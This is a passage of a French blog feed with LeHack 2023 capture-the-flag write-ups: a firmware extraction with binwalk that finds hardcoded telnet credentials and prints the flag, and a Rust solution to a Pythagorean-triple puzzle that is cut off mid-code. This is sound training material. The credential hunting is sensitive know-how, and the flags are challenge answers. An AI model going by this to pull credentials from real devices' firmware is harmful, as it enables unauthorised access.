+&lt;p&gt;Cette conférence prouve que les sécurités physiques ne sont pas encore au niveau de sécurité attendu par les professionnels et elle démontre le besoin de sensibiliser les collaborateurs des entreprises à la présence d’intrus dans leurs locaux.&lt;/p&gt;</content><author><name></name></author><category term="Articles" /><summary type="html">Advens à l’évènement LeHack 2023</summary></entry><entry><title type="html">48 Meters underground</title><link href="http://localhost:4000/lehack-2023/48meters_underground.html" rel="alternate" type="text/html" title="48 Meters underground" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/lehack-2023/48meters_underground</id><content type="html" xml:base="http://localhost:4000/lehack-2023/48meters_underground.html">&lt;h1 id=&quot;48-meters-underground&quot;&gt;48 meters underground&lt;/h1&gt;
+
+&lt;p&gt;Nous récupérons un fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firmware.bin&lt;/code&gt; :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file firmware.bin 
+firmware.bin: Linux kernel ARM boot executable zImage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;big-endian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Grâce à la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, nous pouvons identifier que cette image contient un système de fichiers Squashfs. Nous extrayons alors cette image, toujours avec l’outil &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; firmware.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+0             0x0             Linux kernel ARM boot executable zImage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;big-endian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+14419         0x3853          xz compressed data
+14640         0x3930          xz compressed data
+538952        0x83948         Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2068482 bytes, 995 inodes, blocksize: 262144 bytes, created: 2022-05-03 12:34:33
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Le contenu est accessible dans le répertoire créé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_firmware.bin.extracted&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;        
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali 16777216  2 juil. 01:06 firmware.bin
+drwxr-xr-x 75 kali kali    36864 19 juil. 09:32 _firmware.bin.extracted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En parcourant ce répertoire, nous identifions la présence d’un sous-répertoire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squashsf_root&lt;/code&gt;, qui correspond au système de fichiers :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/
+
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali      244  9 mars   2021  00-netstate
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali      338  9 mars   2021  00_preinit.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali      236  9 mars   2021  00-sysctl
+...
+...
+...
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali     5756  9 mars   2021  slhc.ko
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali       17  3 mai    2022  &lt;span class=&quot;nb&quot;&gt;sort
+&lt;/span&gt;drwxr-xr-x 16 kali kali     4096 19 juil. 09:32  squashfs-root
+drwxr-xr-x  2 kali kali     4096 19 juil. 09:32  squashfs-root-0
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali       16  3 mai    2022  ssh
+
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/squashfs-root/
+total 56
+drwxr-xr-x  2 kali kali 4096  9 mars   2021 bin
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 dev
+drwxr-xr-x 18 kali kali 4096 19 juil. 09:32 etc
+drwxr-xr-x 11 kali kali 4096  9 mars   2021 lib
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 mnt
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 overlay
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 proc
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 rom
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 root
+drwxr-xr-x  2 kali kali 4096  9 mars   2021 sbin
+drwxr-xr-x  2 kali kali 4096 20 févr.  2017 sys
+drwxrwxrwt  2 kali kali 4096 20 févr.  2017 tmp
+drwxr-xr-x  7 kali kali 4096 20 févr.  2017 usr
+lrwxrwxrwx  1 kali kali    9 19 juil. 09:32 var -&amp;gt; /dev/null
+drwxr-xr-x  4 kali kali 4096 20 févr.  2017 www
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nous parcourons les différents fichiers/répertoires à la recherche d’informations sensibles. Le dossier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts&lt;/code&gt;, qui contient un script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd.sh&lt;/code&gt;, attire notre attention :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/squashfs-root/etc/           
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  441  9 mars   2021 banner
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  408  9 mars   2021 banner.failsafe
+drwxr-xr-x 2 kali kali 4096 20 févr.  2017 board.d
+drwxr-xr-x 2 kali kali 4096  3 mai    2022 config
+drwxr-xr-x 2 kali kali 4096 20 févr.  2017 crontabs
+...
+...
+...
+lrwxrwxrwx 1 kali kali    9 19 juil. 09:32 resolv.conf -&amp;gt; /dev/null
+drwxr-xr-x 2 kali kali 4096 11 mars   2021 scripts
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali 3017  9 mars   2021 services
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 kali kali  140 11 mars   2021 shadow
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali    9  9 mars   2021 shells
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  896  9 mars   2021 sysctl.conf
+drwxr-xr-x 2 kali kali 4096 20 févr.  2017 sysctl.d
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  128  9 mars   2021 sysupgrade.conf
+lrwxrwxrwx 1 kali kali    9 19 juil. 09:32 TZ -&amp;gt; /dev/null
+drwxr-xr-x 2 kali kali 4096 20 févr.  2017 uci-defaults
+
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/squashfs-root/etc/scripts 
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali 318 11 mars   2021 telnetd.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;En analysant le script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd.sh&lt;/code&gt;, nous identifions que des identifiants de connexion sont présents via le paramètre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt; de la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd&lt;/code&gt;, sous la forme &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username:password&lt;/code&gt;. Ici, les informations identifiées sont les suivantes :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Nom d’utilisateur : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Device_Admin&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Mot de passe : contenu du fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/config/sign&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;_firmware.bin.extracted/squashfs-root/etc/scripts/telnetd.sh        
+&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/config/sign&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;TELNETD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;rgdb
+&lt;span class=&quot;nv&quot;&gt;TELNETD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;rgdb &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; /sys/telnetd&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TELNETD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Start telnetd ...&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/console
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/sbin/login&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;rgbd &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; /runtime/layout/lanif&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+                telnetd &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/sbin/login&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Device_Admin:&lt;span class=&quot;nv&quot;&gt;$sign&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$lf&lt;/span&gt; &amp;amp;
+        &lt;span class=&quot;k&quot;&gt;else
+                &lt;/span&gt;telnetd &amp;amp;
+        &lt;span class=&quot;k&quot;&gt;fi
+fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;La lecture du fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc/config/sign&lt;/code&gt; nous permet alors d’obtenir le mot de passse du compte &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Device_Admin&lt;/code&gt;, et le flag du challenge :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;_firmware.bin.extracted/squashfs-root/etc/config/sign 
+w4ll_h1dd3n_p13c3_&amp;lt;&lt;span class=&quot;nt&quot;&gt;-_-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="Lehack-2023" /><summary type="html">48 meters underground</summary></entry><entry><title type="html">Triangle Wars</title><link href="http://localhost:4000/lehack-2023/trianglewars.html" rel="alternate" type="text/html" title="Triangle Wars" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/lehack-2023/trianglewars</id><content type="html" xml:base="http://localhost:4000/lehack-2023/trianglewars.html">&lt;h1 id=&quot;triangle-wars&quot;&gt;Triangle Wars&lt;/h1&gt;
+
+&lt;p&gt;L’énoncé du problème demande le périmètre, inférieur à 1 000 000, qui présente le plus grand nombre de formations de triangles de Pythagore.&lt;/p&gt;
+
+&lt;p&gt;Un triangle de Pythagore est un triangle rectangle dont les longueurs des trois côtés (a, b, c) satisfont au théorème de Pythagore (a² + b² = c²). Notre tâche consiste à énumérer efficacement les triangles possibles et à rechercher les périmètres qui produisent le plus grand nombre de triangles de Pythagore uniques.&lt;/p&gt;
+
+&lt;p&gt;Pour une approche optimisée, nous utilisons la formule d’Euclide pour générer des triangles de Pythagore primitifs. La formule stipule que pour chaque paire d’entiers coprimes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; où :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m &amp;gt; n &amp;gt; 0&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a = m² - n²&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b = 2mn&lt;/code&gt;, et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c = m² + n²&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a² + b² = c²&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; ne doivent pas être impairs tous les deux&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perimeter = a + b + c&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;/// Algorithme Euclidien pour trouver le PGCD&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_000_000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;// On initialise un vecteur afin de stocker le nombre de triangles de&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;// Pythagore par périmètre&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perimeter_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;vec!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;usize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;// Valeur maximale de m, pour laquelle a + b + c &amp;lt;= 1 000 000&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mlimit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;f64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mlimit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;// On check si m et n sont coprimes et ne sont pas tous les deux impairs&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;c&quot;&gt;// Calculs du triplet de Pythagore&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;nn&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;c&quot;&gt;// Calcul du périmètre&lt;/span&gt;
